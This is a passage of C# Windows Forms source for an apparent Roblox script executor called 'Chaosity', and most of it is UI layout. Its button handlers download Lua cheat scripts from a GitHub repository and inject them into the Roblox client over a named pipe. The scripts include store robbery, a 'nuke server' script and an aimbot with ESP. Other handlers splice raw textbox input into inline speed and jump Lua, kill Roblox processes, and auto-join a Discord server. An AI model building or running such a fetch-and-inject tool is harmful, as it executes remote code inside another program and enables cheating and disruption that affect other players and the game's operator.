      NamedPipes.LuaPipe(this.webClient.DownloadString("https://raw.githubusercontent.com/ChaosityYT/ChaosityPremiumScripts/master/JailbreakCarFlight.txt"));
    }

    private void button59_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://raw.githubusercontent.com/ChaosityYT/ChaosityPremiumScripts/master/JailbreakInstantGetAllGuns.txt"));
    }

    private void button39_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://raw.githubusercontent.com/ChaosityYT/ChaosityPremiumScripts/master/JailbreakInstantPolice.txt"));
    }

    private void button51_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://raw.githubusercontent.com/ChaosityYT/ChaosityPremiumScripts/master/JailbreakRobSmallStores.txt"));
    }

    private void button54_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://raw.githubusercontent.com/ChaosityYT/ChaosityPremiumScripts/master/JailbreakInfiniteNitroSticks.txt"));
    }

    private void button44_Click(object sender, EventArgs e)
    {
      int num = (int) MessageBox.Show("To use this script correctly you must buy Uranium first.", "Jailbreak Nuke Server");
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://raw.githubusercontent.com/ChaosityYT/ChaosityPremiumScripts/master/JailbreakNukeServerSS.txt"));
    }

    private void button47_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://raw.githubusercontent.com/ChaosityYT/ChaosityPremiumScripts/master/JailbreakPremiumGUI.txt"));
    }

    private void button36_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://raw.githubusercontent.com/ChaosityYT/ChaosityPremiumScripts/master/JailbreakGetKeycard.txt"));
    }

    private void button57_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://raw.githubusercontent.com/ChaosityYT/ChaosityPremiumScripts/master/JailbreakInstantLiftGate.txt"));
    }

    private void button58_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://raw.githubusercontent.com/ChaosityYT/ChaosityPremiumScripts/master/JailbreakInstantExplodeWall.txt"));
    }

    private void button49_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("G.Speed = " + this.flatTextBox2.Text + "\r\n\r\nlocal Plrs = game:GetService(\"Players\")\r\n\r\nlocal Plr = Plrs.LocalPlayer\r\nlocal Character = Plr.Character\r\n\r\nif Character then\r\nlocal Hum = Character.Humanoid\r\nHum.Changed:connect(function()\r\nHum.WalkSpeed = _G.Speed\r\nend)\r\nHum.WalkSpeed = _G.Speed\r\nend\r\n\r\n\r\nPlr.CharacterAdded:connect(function(Char)\r\nCharacter = Char\r\nrepeat wait() until Char:FindFirstChild(\"Humanoid\")\r\nlocal Hum = Char.Humanoid\r\nHum.Changed:connect(function()\r\nHum.WalkSpeed = _G.Speed\r\nend)\r\nHum.WalkSpeed = _G.Speed\r\nend)");
    }

    private void checkBox5_CheckedChanged(object sender, EventArgs e)
    {
      if (this.checkBox5.Checked)
        NamedPipes.LuaPipe(this.webClient.DownloadString("https://raw.githubusercontent.com/ChaosityYT/ChaosityPremiumScripts/master/JailbreakRainbowNitro.txt"));
      else
        NamedPipes.LuaPipe(this.webClient.DownloadString("https://raw.githubusercontent.com/ChaosityYT/ChaosityPremiumScripts/master/JailbreakRainbowNitro.txt"));
    }

    private void button61_Click(object sender, EventArgs e)
    {
      this.tabControl1.SelectedTab = this.PremiumGames;
    }

    private void button42_Click(object sender, EventArgs e)
    {
      this.tabControl1.SelectedTab = this.JailbreakTeleports;
    }

    private void button50_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("JumpPower.MouseButton1Down:connect(function()\r\n           wait()    \r\n         while true do\r\n          wait()\r\n        _G.JumpPower = " + this.flatTextBox3.Text + "local run = game:GetService('RunService') local players = game:GetService('Players') if _G.InitJP ~= true then run.Heartbeat:connect(function() players.LocalPlayer.Character.Humanoid.JumpPower = _G.JumpPower end) _G.InitJP = true end\r\n        end\r\nend)");
    }

    private void button52_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://raw.githubusercontent.com/ChaosityYT/ChaosityPremiumScripts/master/JailbreakCarSpeed.txt"));
    }

    private void cb3_CheckedChanged_1(object sender, EventArgs e)
    {
    }

    private void button67_Click(object sender, EventArgs e)
    {
      foreach (Process process in Process.GetProcessesByName("RobloxPlayerBeta"))
        process.Kill();
    }

    private void ChaosityPremiumAPI_CheckedChanged(object sender, EventArgs e)
    {
    }

    private void checkBox1_CheckedChanged_1(object sender, EventArgs e)
    {
    }

    private void label5_Click(object sender, EventArgs e)
    {
      this.Hide();
      new OMGGameHubMain().Show();
      if (Process.GetProcessesByName("Discord").Length == 0)
        return;
      this.JoinServer("DEVYCQp");
    }

    private void label4_Click(object sender, EventArgs e)
    {
      this.Hide();
      new FGameHubMain().Show();
      if (Process.GetProcessesByName("Discord").Length == 0)
        return;
      this.JoinServer("DEVYCQp");
    }

    private void label6_Click(object sender, EventArgs e)
    {
      this.Hide();
      new DGameHubMain().Show();
      if (Process.GetProcessesByName("Discord").Length == 0)
        return;
      this.JoinServer("DEVYCQp");
    }

    private void label3_Click(object sender, EventArgs e)
    {
      this.Hide();
      new ChaosityMain().Show();
      if (Process.GetProcessesByName("Discord").Length == 0)
        return;
      this.JoinServer("DEVYCQp");
    }

    private void label12_Click(object sender, EventArgs e)
    {
      this.tabControl1.SelectedTab = this.PremiumGames;
      if (Process.GetProcessesByName("Discord").Length == 0)
        return;
      this.JoinServer("DEVYCQp");
    }

    private void label13_Click(object sender, EventArgs e)
    {
      this.tabControl1.SelectedTab = this.PremiumGames;
      if (Process.GetProcessesByName("Discord").Length == 0)
        return;
      this.JoinServer("DEVYCQp");
    }

    private void button18_Click_2(object sender, EventArgs e)
    {
      this.Hide();
      new Key_System().Show();
    }

    private void button30_Click_1(object sender, EventArgs e)
    {
      this.tabControl1.SelectedTab = this.PremiumGames;
      this.button63.Visible = false;
      this.button68.Visible = true;
      if (Process.GetProcessesByName("Discord").Length == 0)
        return;
      this.JoinServer("DEVYCQp");
    }

    private void button68_Click(object sender, EventArgs e)
    {
      this.tabControl1.SelectedTab = this.MainPage;
      this.button63.Visible = true;
    }

    private void button69_Click(object sender, EventArgs e)
    {
      try
      {
        this.Hide();
        new ChaosityMain().Show();
      }
      catch (Exception ex)
      {
       
      }
      if (Process.GetProcessesByName("Discord").Length == 0)
        return;
      this.JoinServer("DEVYCQp");
    }

    private void button18_Click_3(object sender, EventArgs e)
    {
      this.Hide();
      new Key_System().Show();
    }

    private void button70_Click(object sender, EventArgs e)
    {
      this.Hide();
      new Key_System().Show();
    }

    private void button18_Click_4(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://raw.githubusercontent.com/ChaosityYT/ChaosityPremiumScripts/master/OwlHubAimbotAndESP.txt"));
    }

    private void pictureBox1_Click_1(object sender, EventArgs e)
    {
      this.tabControl1.SelectedTab = this.PremiumScripts;
    }

    private void label8_Click(object sender, EventArgs e)
    {
      Process.Start("https://www.roblox.com/games/606849621/");
    }

    private void label14_Click(object sender, EventArgs e)
    {
      this.tabControl1.SelectedTab = this.PremiumScripts;
    }

    private void button32_Click(object sender, EventArgs e)
    {
      this.tabControl1.SelectedTab = this.PremiumGames;
    }

    private void button68_Click_1(object sender, EventArgs e)
    {
      this.tabControl1.SelectedTab = this.MainPage;
      this.button63.Visible = true;
      this.button68.Visible = false;
    }

    private void Chaosity_Leave(object sender, EventArgs e)
    {
      this.api.SetIdentity("");
    }

    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        this.components.Dispose();
      base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
      this.components = (IContainer) new Container();
      this.panel1 = new Panel();
      this.button68 = new Button();
      this.button63 = new Button();
      this.InjectionButtonPannel = new Button();
      this.label2 = new Label();
      this.button7 = new Button();
      this.cb2 = new CheckBox();
      this.bunifuElipse1 = new BunifuElipse(this.components);
      this.button1 = new Button();
      this.button2 = new Button();
      this.bunifuDragControl1 = new BunifuDragControl(this.components);
      this.bunifuDragControl2 = new BunifuDragControl(this.components);
      this.listBox1 = new ListBox();
      this.bunifuElipse2 = new BunifuElipse(this.components);
      this.bunifuElipse3 = new BunifuElipse(this.components);
      this.bunifuElipse4 = new BunifuElipse(this.components);
      this.bunifuElipse5 = new BunifuElipse(this.components);
      this.bunifuElipse6 = new BunifuElipse(this.components);
      this.timer1 = new System.Windows.Forms.Timer(this.components);
      this.button4 = new Button();
      this.topGamesRefresh = new System.Windows.Forms.Timer(this.components);
      this.flatTextBox1 = new FlatTextBox();
      this.button3 = new Button();
      this.webBrowser1 = new WebBrowser();
      this.injectDet = new System.Windows.Forms.Timer(this.components);
      this.button5 = new Button();
      this.tabControl1 = new TabControl();
      this.MainPage = new TabPage();
      this.button15 = new Button();
      this.button14 = new Button();
      this.richTextBox2 = new RichTextBox();
      this.button17 = new Button();
      this.Settings = new TabPage();
      this.button67 = new Button();
      this.button64 = new Button();
      this.checkBox3 = new CheckBox();
      this.button21 = new Button();
      this.button10 = new Button();
      this.button29 = new Button();
      this.button19 = new Button();
      this.button28 = new Button();
      this.PremiumGames = new TabPage();
      this.label15 = new Label();
      this.button27 = new Button();
      this.button22 = new Button();
      this.button23 = new Button();
      this.button24 = new Button();
      this.button25 = new Button();
      this.button26 = new Button();
      this.flowLayoutPanel1 = new FlowLayoutPanel();
      this.panel2 = new Panel();
      this.pictureBox1 = new PictureBox();
      this.label14 = new Label();
      this.panel5 = new Panel();
      this.pictureBox6 = new PictureBox();
      this.label8 = new Label();
      this.panel7 = new Panel();
      this.pictureBox7 = new PictureBox();
      this.label9 = new Label();
      this.panel8 = new Panel();
      this.pictureBox8 = new PictureBox();
      this.label10 = new Label();
      this.panel9 = new Panel();
      this.pictureBox9 = new PictureBox();
      this.label11 = new Label();
      this.GameHubs = new TabPage();
      this.label13 = new Label();
      this.label12 = new Label();
      this.label6 = new Label();
      this.label5 = new Label();
      this.label4 = new Label();
      this.label3 = new Label();
      this.button13 = new Button();
      this.button12 = new Button();
      this.button11 = new Button();
      this.button9 = new Button();
      this.button30 = new Button();
      this.button16 = new Button();
      this.button69 = new Button();
      this.PremiumScripts = new TabPage();
      this.button32 = new Button();
      this.button18 = new Button();
      this.JailbreakCommands = new TabPage();
      this.label17 = new Label();
      this.label16 = new Label();
      this.checkBox5 = new CheckBox();
      this.checkBox4 = new CheckBox();
      this.button61 = new Button();
      this.button60 = new Button();
      this.button59 = new Button();
      this.button58 = new Button();
      this.button57 = new Button();
      this.button56 = new Button();
      this.button55 = new Button();
      this.button48 = new Button();
      this.button54 = new Button();
      this.button53 = new Button();
      this.button52 = new Button();
      this.flatTextBox4 = new FlatTextBox();
      this.button51 = new Button();
      this.button50 = new Button();
      this.button49 = new Button();
      this.flatTextBox3 = new FlatTextBox();
      this.flatTextBox2 = new FlatTextBox();
      this.button47 = new Button();
      this.button46 = new Button();
      this.button45 = new Button();
      this.button44 = new Button();
      this.button43 = new Button();
      this.button42 = new Button();
      this.button41 = new Button();
      this.button40 = new Button();
      this.button39 = new Button();
      this.button38 = new Button();
      this.button37 = new Button();
      this.button36 = new Button();
      this.button34 = new Button();
      this.button31 = new Button();
      this.button20 = new Button();
      this.JailbreakTeleports = new TabPage();
      this.button66 = new Button();
      this.button65 = new Button();
      this.button35 = new Button();
      this.button33 = new Button();
      this.PremiumLogin = new TabPage();
      this.button62 = new Button();
      this.label1 = new Label();
      this.textBox2 = new TextBox();
      this.button8 = new Button();
      this.button6 = new Button();
      this.panel1.SuspendLayout();
      this.tabControl1.SuspendLayout();
      this.MainPage.SuspendLayout();
      this.Settings.SuspendLayout();
      this.PremiumGames.SuspendLayout();
      this.flowLayoutPanel1.SuspendLayout();
      this.panel2.SuspendLayout();
      ((ISupportInitialize) this.pictureBox1).BeginInit();
      this.panel5.SuspendLayout();
      ((ISupportInitialize) this.pictureBox6).BeginInit();
      this.panel7.SuspendLayout();
      ((ISupportInitialize) this.pictureBox7).BeginInit();
      this.panel8.SuspendLayout();
      ((ISupportInitialize) this.pictureBox8).BeginInit();
      this.panel9.SuspendLayout();
      ((ISupportInitialize) this.pictureBox9).BeginInit();
      this.GameHubs.SuspendLayout();
      this.PremiumScripts.SuspendLayout();
      this.JailbreakCommands.SuspendLayout();
      this.JailbreakTeleports.SuspendLayout();
      this.PremiumLogin.SuspendLayout();
      this.SuspendLayout();
      this.panel1.BackColor = System.Drawing.Color.Black;
      this.panel1.Controls.Add((Control) this.button68);
      this.panel1.Controls.Add((Control) this.button63);
      this.panel1.Controls.Add((Control) this.InjectionButtonPannel);
      this.panel1.Controls.Add((Control) this.label2);
      this.panel1.Controls.Add((Control) this.button7);
      this.panel1.Location = new Point(-1, -1);
      this.panel1.Name = "panel1";
      this.panel1.Size = new Size(608, 36);
      this.panel1.TabIndex = 3;
      this.panel1.Paint += new PaintEventHandler(this.panel1_Paint);
      this.button68.BackColor = System.Drawing.Color.Black;
      this.button68.Cursor = Cursors.Hand;
      this.button68.FlatAppearance.BorderColor = System.Drawing.Color.White;
      this.button68.FlatAppearance.BorderSize = 0;
      this.button68.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(45, 45, 45);
      this.button68.FlatAppearance.MouseOverBackColor = System.Drawing.Color.FromArgb(40, 40, 40);
      this.button68.FlatStyle = FlatStyle.Flat;
      this.button68.Font = new Font("Roboto", 8f, FontStyle.Bold);
      this.button68.ForeColor = System.Drawing.Color.White;
      this.button68.Location = new Point(427, 8);
      this.button68.Name = "button68";
      this.button68.Size = new Size(118, 25);
      this.button68.TabIndex = 136;
      this.button68.Text = "Back To Home";
      this.button68.UseVisualStyleBackColor = false;
      this.button68.Visible = false;
      this.button68.Click += new EventHandler(this.button68_Click_1);
      this.button63.BackColor = System.Drawing.Color.Black;
      this.button63.Cursor = Cursors.Hand;
      this.button63.FlatAppearance.BorderColor = System.Drawing.Color.White;
      this.button63.FlatAppearance.BorderSize = 0;
      this.button63.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(45, 45, 45);
      this.button63.FlatAppearance.MouseOverBackColor = System.Drawing.Color.FromArgb(40, 40, 40);
      this.button63.FlatStyle = FlatStyle.Flat;
      this.button63.Font = new Font("Roboto", 8f, FontStyle.Bold);
      this.button63.ForeColor = System.Drawing.Color.White;
      this.button63.Location = new Point(462, 7);
      this.button63.Name = "button63";
      this.button63.Size = new Size(83, 25);
      this.button63.TabIndex = 55;
      this.button63.Text = "Settings";
      this.button63.UseVisualStyleBackColor = false;
      this.button63.Click += new EventHandler(this.button63_Click);
      this.InjectionButtonPannel.BackColor = System.Drawing.Color.Transparent;
      this.InjectionButtonPannel.BackgroundImageLayout = ImageLayout.Zoom;
      this.InjectionButtonPannel.Cursor = Cursors.Hand;
      this.InjectionButtonPannel.FlatAppearance.BorderColor = System.Drawing.Color.FromArgb(80, 80, 80);
      this.InjectionButtonPannel.FlatAppearance.BorderSize = 0;
      this.InjectionButtonPannel.FlatAppearance.MouseDownBackColor = System.Drawing.Color.Transparent;
      this.InjectionButtonPannel.FlatAppearance.MouseOverBackColor = System.Drawing.Color.Transparent;
      this.InjectionButtonPannel.FlatStyle = FlatStyle.Flat;
      this.InjectionButtonPannel.Font = new Font("Bahnschrift SemiCondensed", 7f);
      this.InjectionButtonPannel.ForeColor = System.Drawing.Color.White;
      this.InjectionButtonPannel.Location = new Point(13, 8);
      this.InjectionButtonPannel.Name = "InjectionButtonPannel";
      this.InjectionButtonPannel.Size = new Size(20, 24);
      this.InjectionButtonPannel.TabIndex = 45;
      this.InjectionButtonPannel.UseVisualStyleBackColor = false;
      this.InjectionButtonPannel.Click += new EventHandler(this.InjectionButtonPannel_Click);
      this.label2.AutoSize = true;
      this.label2.Font = new Font("Segoe UI", 7.8f, FontStyle.Bold | FontStyle.Italic);
      this.label2.ForeColor = System.Drawing.Color.White;
      this.label2.Location = new Point(39, 14);
      this.label2.Name = "label2";
      this.label2.Size = new Size(66, 13);
      this.label2.TabIndex = 5;
      this.label2.Text = "Inject Here!";
      this.label2.Click += new EventHandler(this.label2_Click);
      this.button7.BackColor = System.Drawing.Color.Transparent;
      this.button7.Cursor = Cursors.Hand;
      this.button7.FlatAppearance.BorderColor = System.Drawing.Color.White;
      this.button7.FlatAppearance.BorderSize = 0;
      this.button7.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(45, 45, 45);
      this.button7.FlatAppearance.MouseOverBackColor = System.Drawing.Color.FromArgb(40, 40, 40);
      this.button7.FlatStyle = FlatStyle.Flat;
      this.button7.Font = new Font("Bahnschrift", 8f);
      this.button7.ForeColor = System.Drawing.Color.White;
      this.button7.Location = new Point(551, 9);
      this.button7.Name = "button7";
      this.button7.Size = new Size(20, 20);
      this.button7.TabIndex = 44;
      this.button7.Text = "-";
      this.button7.UseVisualStyleBackColor = false;
      this.button7.Click += new EventHandler(this.button7_Click);
      this.cb2.AutoSize = true;
      this.cb2.Checked = true;
      this.cb2.CheckState = CheckState.Checked;
      this.cb2.Font = new Font("Roboto", 8f, FontStyle.Bold);
      this.cb2.Location = new Point(447, 125);
      this.cb2.Name = "cb2";
      this.cb2.Size = new Size(52, 17);
      this.cb2.TabIndex = 48;
      this.cb2.Text = "API 1";
      this.cb2.UseVisualStyleBackColor = true;
      this.cb2.CheckedChanged += new EventHandler(this.checkBox2_CheckedChanged);
      this.bunifuElipse1.ElipseRadius = 20;
      this.bunifuElipse1.TargetControl = (Control) this;
      this.button1.BackColor = System.Drawing.Color.Transparent;
      this.button1.Cursor = Cursors.Hand;
      this.button1.FlatAppearance.BorderColor = System.Drawing.Color.FromArgb(45, 45, 45);
      this.button1.FlatAppearance.BorderSize = 0;
      this.button1.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(45, 45, 45);
      this.button1.FlatAppearance.MouseOverBackColor = System.Drawing.Color.FromArgb(40, 40, 40);
      this.button1.FlatStyle = FlatStyle.Flat;
      this.button1.Font = new Font("Roboto", 8f, FontStyle.Bold);
      this.button1.ForeColor = System.Drawing.Color.White;
      this.button1.Location = new Point(12, 275);
      this.button1.Name = "button1";
      this.button1.Size = new Size(84, 25);
      this.button1.TabIndex = 37;
      this.button1.Text = "Execute";
      this.button1.UseVisualStyleBackColor = false;
      this.button1.Click += new EventHandler(this.button1_Click);
      this.button1.MouseLeave += new EventHandler(this.button1_MouseLeave);
      this.button1.MouseHover += new EventHandler(this.button1_MouseHover);
      this.button2.BackColor = System.Drawing.Color.Transparent;
      this.button2.Cursor = Cursors.Hand;
      this.button2.FlatAppearance.BorderColor = System.Drawing.Color.FromArgb(45, 45, 45);
      this.button2.FlatAppearance.BorderSize = 0;
      this.button2.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(45, 45, 45);
      this.button2.FlatAppearance.MouseOverBackColor = System.Drawing.Color.FromArgb(40, 40, 40);
      this.button2.FlatStyle = FlatStyle.Flat;
      this.button2.Font = new Font("Roboto", 8f, FontStyle.Bold);
      this.button2.ForeColor = System.Drawing.Color.White;
      this.button2.Location = new Point(175, 275);
      this.button2.Name = "button2";
      this.button2.Size = new Size(67, 25);
      this.button2.TabIndex = 38;
      this.button2.Text = "Clear";
      this.button2.UseVisualStyleBackColor = false;
      this.button2.Click += new EventHandler(this.button2_Click);
      this.button2.MouseLeave += new EventHandler(this.button2_MouseLeave);
      this.button2.MouseHover += new EventHandler(this.button2_MouseHover);
      this.bunifuDragControl1.Fixed = true;
      this.bunifuDragControl1.Horizontal = true;
      this.bunifuDragControl1.TargetControl = (Control) this.panel1;
      this.bunifuDragControl1.Vertical = true;
      this.bunifuDragControl2.Fixed = true;
      this.bunifuDragControl2.Horizontal = true;
      this.bunifuDragControl2.TargetControl = (Control) this;
      this.bunifuDragControl2.Vertical = true;
      this.listBox1.BackColor = System.Drawing.Color.Black;
      this.listBox1.BorderStyle = BorderStyle.None;
      this.listBox1.Font = new Font("Roboto", 9f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      this.listBox1.ForeColor = System.Drawing.Color.White;
      this.listBox1.FormattingEnabled = true;
      this.listBox1.ItemHeight = 14;
      this.listBox1.Items.AddRange(new object[1]
      {
        (object) "Script List"
      });
      this.listBox1.Location = new Point(464, 54);
      this.listBox1.Name = "listBox1";
      this.listBox1.Size = new Size(130, 210);
      this.listBox1.Sorted = true;
      this.listBox1.TabIndex = 42;
      this.listBox1.SelectedIndexChanged += new EventHandler(this.listBox1_SelectedIndexChanged);
      this.listBox1.DockChanged += new EventHandler(this.listBox1_DockChanged);
      this.listBox1.DoubleClick += new EventHandler(this.listBox1_DoubleClick);
      this.listBox1.MouseUp += new MouseEventHandler(this.listBox1_MouseUp);
      this.bunifuElipse2.ElipseRadius = 10;
      this.bunifuElipse2.TargetControl = (Control) this.button1;
      this.bunifuElipse3.ElipseRadius = 10;
      this.bunifuElipse3.TargetControl = (Control) this.button2;
      this.bunifuElipse4.ElipseRadius = 10;
      this.bunifuElipse4.TargetControl = (Control) this;
      this.bunifuElipse5.ElipseRadius = 10;
      this.bunifuElipse5.TargetControl = (Control) this;
      this.bunifuElipse6.ElipseRadius = 10;
      this.bunifuElipse6.TargetControl = (Control) this;
      this.timer1.Tick += new EventHandler(this.timer1_Tick);
      this.button4.BackColor = System.Drawing.Color.Black;
      this.button4.Cursor = Cursors.Hand;
      this.button4.FlatAppearance.BorderColor = System.Drawing.Color.FromArgb(45, 45, 45);
      this.button4.FlatAppearance.BorderSize = 0;
      this.button4.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(45, 45, 45);
      this.button4.FlatAppearance.MouseOverBackColor = System.Drawing.Color.FromArgb(40, 40, 40);
      this.button4.FlatStyle = FlatStyle.Flat;
      this.button4.Font = new Font("Roboto", 8f, FontStyle.Bold);
      this.button4.ForeColor = System.Drawing.Color.White;
      this.button4.Location = new Point(321, 275);
      this.button4.Name = "button4";
      this.button4.Size = new Size(138, 25);
      this.button4.TabIndex = 46;
      this.button4.Text = "Game Hubs";
      this.button4.UseVisualStyleBackColor = false;
      this.button4.Click += new EventHandler(this.button4_Click);
      this.button4.MouseLeave += new EventHandler(this.button4_MouseLeave);
      this.button4.MouseHover += new EventHandler(this.button4_MouseHover);
      this.topGamesRefresh.Interval = 15000;
      this.topGamesRefresh.Tick += new EventHandler(this.topGamesRefresh_Tick);
      this.flatTextBox1.BackColor = System.Drawing.Color.Transparent;
      this.flatTextBox1.FocusOnHover = false;
      this.flatTextBox1.Hint = "";
      this.flatTextBox1.Location = new Point(464, 20);
      this.flatTextBox1.Margin = new Padding(2);
      this.flatTextBox1.MaxLength = (int) short.MaxValue;
      this.flatTextBox1.Multiline = false;
      this.flatTextBox1.Name = "flatTextBox1";
      this.flatTextBox1.ReadOnly = false;
      this.flatTextBox1.Size = new Size(96, 29);
      this.flatTextBox1.TabIndex = 47;
      this.flatTextBox1.Text = "\xD83D\xDD0D Search";
      this.flatTextBox1.TextAlign = HorizontalAlignment.Left;
      this.flatTextBox1.TextColor = System.Drawing.Color.FromArgb(192, 192, 192);
      this.flatTextBox1.UseSystemPasswordChar = false;
      this.button3.BackColor = System.Drawing.Color.Transparent;
      this.button3.Cursor = Cursors.Hand;
      this.button3.FlatAppearance.BorderColor = System.Drawing.Color.White;
      this.button3.FlatAppearance.BorderSize = 0;
      this.button3.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(45, 45, 45);
      this.button3.FlatAppearance.MouseOverBackColor = System.Drawing.Color.FromArgb(40, 40, 40);
      this.button3.FlatStyle = FlatStyle.Flat;
      this.button3.Font = new Font("Roboto", 9f, FontStyle.Bold);
      this.button3.ForeColor = System.Drawing.Color.White;
      this.button3.Location = new Point(563, 20);
      this.button3.Name = "button3";
      this.button3.Size = new Size(31, 28);
      this.button3.TabIndex = 48;
      this.button3.Text = "S";
      this.button3.UseVisualStyleBackColor = false;
      this.button3.Click += new EventHandler(this.button3_Click_2);
      this.webBrowser1.Location = new Point(12, 23);
      this.webBrowser1.Margin = new Padding(2);
      this.webBrowser1.MinimumSize = new Size(15, 16);
      this.webBrowser1.Name = "webBrowser1";
      this.webBrowser1.Size = new Size(446, 247);
      this.webBrowser1.TabIndex = 49;
      this.webBrowser1.DocumentCompleted += new WebBrowserDocumentCompletedEventHandler(this.webBrowser1_DocumentCompleted_1);
      this.injectDet.Tick += new EventHandler(this.injectDet_Tick);
      this.button5.BackColor = System.Drawing.Color.Black;
      this.button5.Cursor = Cursors.Hand;
      this.button5.FlatAppearance.BorderColor = System.Drawing.Color.FromArgb(45, 45, 45);
      this.button5.FlatAppearance.BorderSize = 0;
      this.button5.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(45, 45, 45);
      this.button5.FlatAppearance.MouseOverBackColor = System.Drawing.Color.FromArgb(40, 40, 40);
      this.button5.FlatStyle = FlatStyle.Flat;
      this.button5.Font = new Font("Roboto", 8f, FontStyle.Bold);
      this.button5.ForeColor = System.Drawing.Color.White;
      this.button5.Location = new Point(464, 276);
      this.button5.Name = "button5";
      this.button5.Size = new Size(132, 25);
      this.button5.TabIndex = 50;
      this.button5.Text = "Refresh Script List";
      this.button5.UseVisualStyleBackColor = false;
      this.button5.Click += new EventHandler(this.button5_Click_1);
      this.tabControl1.Controls.Add((Control) this.MainPage);
      this.tabControl1.Controls.Add((Control) this.GameHubs);
      this.tabControl1.Controls.Add((Control) this.Settings);
      this.tabControl1.Controls.Add((Control) this.PremiumGames);
      this.tabControl1.Controls.Add((Control) this.PremiumScripts);
      this.tabControl1.Controls.Add((Control) this.JailbreakCommands);
      this.tabControl1.Controls.Add((Control) this.JailbreakTeleports);
      this.tabControl1.Controls.Add((Control) this.PremiumLogin);
      this.tabControl1.ImeMode = ImeMode.NoControl;
      this.tabControl1.Location = new Point(-7, -1);
      this.tabControl1.Name = "tabControl1";
      this.tabControl1.SelectedIndex = 0;
      this.tabControl1.Size = new Size(611, 332);
      this.tabControl1.TabIndex = 52;
      this.MainPage.BackColor = System.Drawing.Color.Black;
      this.MainPage.Controls.Add((Control) this.button15);
      this.MainPage.Controls.Add((Control) this.button14);
      this.MainPage.Controls.Add((Control) this.button2);
      this.MainPage.Controls.Add((Control) this.button5);
      this.MainPage.Controls.Add((Control) this.listBox1);
      this.MainPage.Controls.Add((Control) this.button3);
      this.MainPage.Controls.Add((Control) this.flatTextBox1);
      this.MainPage.Controls.Add((Control) this.button4);
      this.MainPage.Controls.Add((Control) this.webBrowser1);
      this.MainPage.Controls.Add((Control) this.richTextBox2);
      this.MainPage.Controls.Add((Control) this.button1);
      this.MainPage.Controls.Add((Control) this.button17);
      this.MainPage.Location = new Point(4, 22);
      this.MainPage.Name = "MainPage";
      this.MainPage.Padding = new Padding(3);
      this.MainPage.Size = new Size(603, 306);
      this.MainPage.TabIndex = 0;
      this.MainPage.Text = "MainPage";
      this.MainPage.Click += new EventHandler(this.MainPage_Click);
      this.button15.BackColor = System.Drawing.Color.Transparent;
      this.button15.Cursor = Cursors.Hand;
      this.button15.FlatAppearance.BorderColor = System.Drawing.Color.FromArgb(45, 45, 45);
      this.button15.FlatAppearance.BorderSize = 0;
      this.button15.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(45, 45, 45);
      this.button15.FlatAppearance.MouseOverBackColor = System.Drawing.Color.FromArgb(40, 40, 40);
      this.button15.FlatStyle = FlatStyle.Flat;
      this.button15.Font = new Font("Roboto", 8f, FontStyle.Bold);
      this.button15.ForeColor = System.Drawing.Color.White;
      this.button15.Location = new Point(248, 275);
      this.button15.Name = "button15";
      this.button15.Size = new Size(67, 25);
      this.button15.TabIndex = 52;
      this.button15.Text = "Save File";
      this.button15.UseVisualStyleBackColor = false;
      this.button15.Click += new EventHandler(this.button15_Click);
      this.button14.BackColor = System.Drawing.Color.Transparent;
      this.button14.Cursor = Cursors.Hand;
      this.button14.FlatAppearance.BorderColor = System.Drawing.Color.FromArgb(45, 45, 45);
      this.button14.FlatAppearance.BorderSize = 0;
      this.button14.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(45, 45, 45);
      this.button14.FlatAppearance.MouseOverBackColor = System.Drawing.Color.FromArgb(40, 40, 40);
      this.button14.FlatStyle = FlatStyle.Flat;
      this.button14.Font = new Font("Roboto", 8f, FontStyle.Bold);
      this.button14.ForeColor = System.Drawing.Color.White;
      this.button14.Location = new Point(102, 275);
      this.button14.Name = "button14";
      this.button14.Size = new Size(67, 25);
      this.button14.TabIndex = 51;
      this.button14.Text = "Open File";
      this.button14.UseVisualStyleBackColor = false;
      this.button14.Click += new EventHandler(this.button14_Click);
      this.richTextBox2.BackColor = System.Drawing.Color.Black;
      this.richTextBox2.BorderStyle = BorderStyle.None;
      this.richTextBox2.Font = new Font("Roboto", 8f, FontStyle.Bold);
      this.richTextBox2.ForeColor = System.Drawing.Color.White;
      this.richTextBox2.Location = new Point(12, 23);
      this.richTextBox2.Name = "richTextBox2";
      this.richTextBox2.Size = new Size(446, 247);
      this.richTextBox2.TabIndex = 53;
      this.richTextBox2.Text = "Enter Script Here";
      this.richTextBox2.Visible = false;
      this.richTextBox2.TextChanged += new EventHandler(this.richTextBox2_TextChanged);
      this.button17.BackColor = System.Drawing.Color.Transparent;
      this.button17.Cursor = Cursors.Hand;
      this.button17.FlatAppearance.BorderColor = System.Drawing.Color.FromArgb(45, 45, 45);
      this.button17.FlatAppearance.BorderSize = 0;
      this.button17.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(45, 45, 45);
